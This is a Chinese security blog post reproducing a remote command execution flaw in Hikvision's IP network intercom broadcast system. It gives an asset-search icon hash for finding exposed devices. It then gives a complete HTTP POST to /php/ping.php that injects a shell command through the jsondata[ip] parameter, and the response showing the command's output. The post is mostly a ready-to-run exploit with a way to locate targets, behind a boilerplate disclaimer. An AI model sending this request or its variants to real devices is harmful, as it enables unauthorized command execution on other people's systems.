#  【漏洞复现】海康威视IP网络对讲广播系统远程命令执行漏洞   
仲瑿  新势界NewFrontier   2024-01-03 14:01  
  
**声明**  
  
**该公众号大部分文章来自作者日常学习笔记，也有部分文章是经过作者授权和其他公众号白名单转载，未经授权，严禁转载，如需转载，联系开白。请勿利用文章内的相关技术从事非法测试，如因此产生的一切不良后果与文章作者和本公众号无关。**  
  
**公众号现在只对常读和星标的公众号才展示大图推送，建议把公众号设为星标，否则可能就看不到啦！感谢各位师傅。**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/HboZfk6j916a3yuImc0IM9jBibYS14e12yyic3aWtJPjBb5RjA9t2oTqcZPxHzgicmVEpff3ErQeUCv7zP8OFZy8Q/640?wx_fmt=png&from=appmsg "")  
  
**资产收集**  
```
web.icon=="e854b2eaa9e4685a95d8052d5e3165bc"
```  
  
****  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/HboZfk6j916a3yuImc0IM9jBibYS14e12mA36pF3JAxHy5rLwcZWxPur10sCdewKFugFLejzPhz3w3FM9uvRfFQ/640?wx_fmt=png&from=appmsg "")  
  
**漏洞复现**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/HboZfk6j916a3yuImc0IM9jBibYS14e12TaulQtH6zjWqiacR2SpmlxSSNMhAO2cLOkbgib2lw5NLjnv7YAiaE0FWA/640?wx_fmt=png&from=appmsg "")  
  
**构造请求包，向靶场发送如下数据包执行ipconfig命令**  
```

POST /php/ping.php HTTP/1.1
Host: x.x.x.x
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0
Content-Length: 51
Accept: application/json, text/javascript, */*; q=0.01
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Connection: close
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest

jsondata%5Btype%5D=99&jsondata%5Bip%5D=ipconfig
```  
  
**响应内容**  
```
HTTP/1.1 200 OK
Server: nginx/1.18.0
Date: Tue, 02 Jan 2024 07:47:56 GMT
Content-Type: text/html; charset=utf-8
Connection: close
X-Powered-By: PHP/7.4.7
Access-Control-Allow-Origin: *
Access-Control-Allow-Headers: X-Requested-With
Access-Control-Allow-Methods: GET,POST,OPTIONS
Content-Length: 463

 ["","Windows IP \u914d\u7f6e","","","\u4ee5\u592a\u7f51\u9002\u914d\u5668 \u4ee5\u592a\u7f51:","","   \u8fde\u63a5\u7279\u5b9a\u7684 DNS \u540e\u7f00 . . . . . . . :","   \u672c\u5730\u94fe\u63a5 IPv6 \u5730\u5740. . . . . . . . : fe80::6d38:2c60:9aa6:1142%2","   IPv4 \u5730\u5740 . . . . . . . . . . . . : 172.17.32.14","   \u5b50\u7f51\u63a9\u7801  . . . . . . . . . . . . : 255.255.240.0","   \u9ed8\u8ba4\u7f51\u5173. . . . . . . . . . . . . : 172.17.32.1"]
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/HboZfk6j916a3yuImc0IM9jBibYS14e12zacDZ7vPxkQJOhpib5H1c6mzbBCb2p1bACcUUjicBU774YhtEGYvZibAQ/640?wx_fmt=png&from=appmsg "")  
  
